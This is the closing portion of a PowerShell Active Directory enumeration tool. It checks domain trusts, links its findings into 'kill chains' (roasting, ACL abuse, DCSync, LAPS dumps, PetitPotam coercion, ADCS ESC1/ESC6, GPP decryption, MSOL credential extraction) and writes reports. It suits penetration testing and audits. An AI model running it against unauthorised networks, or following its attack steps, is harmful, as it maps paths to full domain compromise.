    $res = Search-LDAP -Filter "(objectClass=trustedDomain)" -Properties @("flatName","trustAttributes")
    foreach ($t in $res) {
        $attr = if ($t.Properties["trustAttributes"]) { $t.Properties["trustAttributes"][0] } else { 0 }
        if (($attr -band 4) -eq 0) { 
             Add-Finding "Trust" "Trust: $($t.Properties["flatName"][0])" "MEDIUM" "External/Legacy Trust." "Check for SID Filtering disabled -> SID History Injection." | Out-Null; $found = $true
        }
    }
    if (-not $found) { Write-Line "    [-] No external/insecure trusts detected." "DarkGray" }
}

function Analyze-AttackChains {
    Write-Section "ATTACK CHAIN ANALYSIS (Correlation Engine)"
    Write-Line "    [*] Correlating findings to identify Kill Chains..." "Gray"
    $chainsFound = $false

    # 1. DATA PREPARATION
    $compromisableUsers = @()
    $global:State.Findings | Where-Object { $_.Category -in @("AS-REP", "Kerberoast") } | ForEach-Object {
        $cleanName = $_.Name.Split("\")[-1].Split("@")[0]
        $compromisableUsers += $cleanName
    }

    $roastings = $global:State.Findings | Where-Object { $_.Category -in @("AS-REP", "Kerberoast") }
    foreach ($r in $roastings) {
        Write-Line ""
        Write-Line "    [!!!] KILL CHAIN: Credential Access ($($r.Category))" "Red"
        Write-Line "        1. Target: $($r.Name)" "Gray"
        Write-Line "        2. Action: Request Ticket -> Crack Hash." "White"
        $chainsFound = $true
    }
    
    # Get Critical ACLs
    $aclFindings = $global:State.Findings | Where-Object { $_.Category -eq "ACL" -and $_.Severity -eq "HIGH" }

    # -----------------------------------------------------------------------
    # CHAIN 0: ACL ESCALATION
    # -----------------------------------------------------------------------
    foreach ($acl in $aclFindings) {
        
        # A) Domain Root Takeover (NEW LOGIC)
        # If ANYONE has WriteDacl/GenericAll on Domain Root, it is a critical path.
        if ($acl.Name -match "DOMAIN ROOT") {
            # Extract the Principal name from the string "Principal -> Target"
            $principal = $acl.Name.Split("-")[0].Trim()
            
            Write-Line ""
            Write-Line "    [!!!] KILL CHAIN 0: Domain Root Takeover ($principal)" "Red"
            Write-Line "        1. Finding: '$principal' has critical rights on the Domain Root." "Gray"
            Write-Line "        2. Risk: $($acl.Details)" "Gray"
            Write-Line "        3. Action: If you can compromise '$principal', you own the domain." "White"
            $chainsFound = $true
        }

        # B) Weak User -> High Privileges
        foreach ($weakUser in $compromisableUsers) {
            if ($acl.Name -match "\b$weakUser\b" -or $acl.Details -match "\b$weakUser\b") {
                Write-Line ""
                Write-Line "    [!!!] KILL CHAIN 1: Roastable User -> ACL Escalation" "Red"
                Write-Line "        1. Phase 1: Compromise user '$weakUser' via Roasting." "Gray"
                Write-Line "        2. Phase 2: User has critical ACL rights: $($acl.Name)" "Gray"
                Write-Line "        3. Action: Abuse ACL ($($acl.Details)) to take control." "White"
                $chainsFound = $true
            }
        }

        # C) Direct Escalation (Current User)
        if ($acl.Name -match "YOU HAVE THIS") {
            Write-Line ""
            Write-Line "    [!!!] KILL CHAIN 0: Direct ACL Escalation (YOU)" "Red"
            Write-Line "        1. Finding: Your current token has critical rights." "Gray"
            Write-Line "        2. Target: $($acl.Name)" "Gray"
            Write-Line "        3. Action: Execute the TTP command immediately." "White"
            $chainsFound = $true
        }
    }

    # -----------------------------------------------------------------------
    # CHAIN: Exchange
    # -----------------------------------------------------------------------
    $exchangeFindings = $global:State.Findings | Where-Object { $_.Category -eq "Exchange" }
    foreach ($ex in $exchangeFindings) {
        foreach ($weakUser in $compromisableUsers) {
            if ($ex.Name -match "\b$weakUser\b") {
                Write-Line ""
                Write-Line "    [!!!] KILL CHAIN: Roastable User -> Exchange DCSync" "Red"
                Write-Line "        1. Phase 1: Crack hash for '$weakUser'." "Gray"
                Write-Line "        2. Phase 2: User is in privileged Exchange group." "Gray"
                Write-Line "        3. Action: Perform DCSync." "White"
                $chainsFound = $true
            }
        }
    }

    # -----------------------------------------------------------------------
    # CHAIN: LAPS
    # -----------------------------------------------------------------------
    $lapsFindings = $global:State.Findings | Where-Object { $_.Category -eq "LAPS" }
    foreach ($laps in $lapsFindings) {
        foreach ($weakUser in $compromisableUsers) {
            if ($laps.Name -match "\b$weakUser\b") {
                Write-Line ""
                Write-Line "    [!!!] KILL CHAIN: Roastable User -> LAPS Dump" "Red"
                Write-Line "        1. Phase 1: Crack hash for '$weakUser'." "Gray"
                Write-Line "        2. Action: Dump LAPS password." "White"
                $chainsFound = $true
            }
        }
    }

    # -----------------------------------------------------------------------
    # CHAIN: Unconstrained Delegation
    # -----------------------------------------------------------------------
    $unc = $global:State.Findings | Where-Object { $_.Details -match "Unconstrained Delegation" }
    if ($unc) {
        Write-Line ""
        Write-Line "    [!!!] KILL CHAIN: Unconstrained Delegation -> DC Compromise" "Red"
        Write-Line "        1. Target: Server '$($unc.Name)' has Unconstrained Delegation." "Gray"
        Write-Line "        2. Prereq: Compromise this server." "Gray"
        Write-Line "        3. Action: Coerce DC auth (PetitPotam) & Dump TGT." "White"
        $chainsFound = $true
    }

    # -----------------------------------------------------------------------
    # CHAIN: ADCS
    # -----------------------------------------------------------------------
    $adcs = $global:State.Findings | Where-Object { $_.Category -eq "ADCS" -and ($_.Name -match "ESC1" -or $_.Name -match "ESC6") }
    if ($adcs) {
        Write-Line ""
        Write-Line "    [!!!] KILL CHAIN: ADCS -> Domain Admin" "Red"
        Write-Line "        1. Vulnerability: $($adcs[0].Name)" "Gray"
        Write-Line "        2. Action: Request certificate for 'Administrator'." "White"
        $chainsFound = $true
    }

    # -----------------------------------------------------------------------
    # CHAIN: GPO
    # -----------------------------------------------------------------------
    $gpp = $global:State.Findings | Where-Object { $_.Category -eq "GPO" }
    if ($gpp) {
        Write-Line ""
        Write-Line "    [!!!] KILL CHAIN: GPO Password -> Lateral Movement" "Red"
        Write-Line "        1. Finding: Decryptable password in SYSVOL." "Gray"
        Write-Line "        2. Action: Use 'gpp-decrypt'." "White"
        $chainsFound = $true
    }

    # -----------------------------------------------------------------------
    # CHAIN: Hybrid
    # -----------------------------------------------------------------------
    $hybrid = $global:State.Findings | Where-Object { $_.Category -eq "Hybrid" }
    if ($hybrid) {
        Write-Line ""
        Write-Line "    [!!!] KILL CHAIN: On-Prem -> Cloud Admin" "Red"
        Write-Line "        1. Target: Azure AD Connect Server." "Gray"
        Write-Line "        2. Action: Extract MSOL credentials." "White"
        $chainsFound = $true
    }

    if (-not $chainsFound) {
        Write-Line "    [-] No obvious low-hanging attack chains detected." "DarkGray"
    }
}

function Save-Report {
    Write-Section "REPORTING"
    if ($OutFile) {
        $timeStamp = Get-Date -Format "yyyyMMdd_HHmm"
        if ($Format -eq "JSON") {
            $fName = "$OutFile`_$timeStamp.json"
            $data = @{ Meta = @{ Domain = $global:State.BaseDN; Tool = "ADAIO v1.0" }; Findings = $global:State.Findings }
            $data | ConvertTo-Json -Depth 5 | Out-File $fName
            Write-Line "[+] JSON Report: $fName" "Green"
        } else {
            $fName = "$OutFile`_$timeStamp.txt"
            $sb = new-object System.Text.StringBuilder
            [void]$sb.AppendLine("ADAIO v1.0 Report")
            
            foreach($f in $global:State.Findings) {
                [void]$sb.AppendLine("[$($f.Severity)] $($f.Category): $($f.Name)")
                [void]$sb.AppendLine("   Detail: $($f.Details)")
                
                if($f.Tradecraft){ 
                    [void]$sb.AppendLine("   Exploit: $($f.Tradecraft)") 
                }
                
                [void]$sb.AppendLine("-" * 30)
            }
            # ---------------------------------------

            $sb.ToString() | Out-File $fName
            Write-Line "[+] Text Report: $fName" "Green"
        }
    }
}

# ---------------------------------------------------------------------------
# MAIN EXECUTION FLOW
# ---------------------------------------------------------------------------

Show-Banner
Write-Line "Starting Enumeration..."

Init-AD

Enum-DomainPolicy
Enum-Identity
Enum-SIDHistory

Enum-ACLPrivilege    
Enum-ShadowCredentials
Enum-LAPS

Enum-Infrastructure  
Enum-Exchange        
Enum-Trusts          
Enum-Delegation
Enum-DCSync
Enum-GPO-Passwords   
Enum-AdminSDHolder   

Enum-ADCS 

Analyze-AttackChains           

Save-Report

Write-Line ""
Write-Line "[*] Enumeration Complete." "Green"
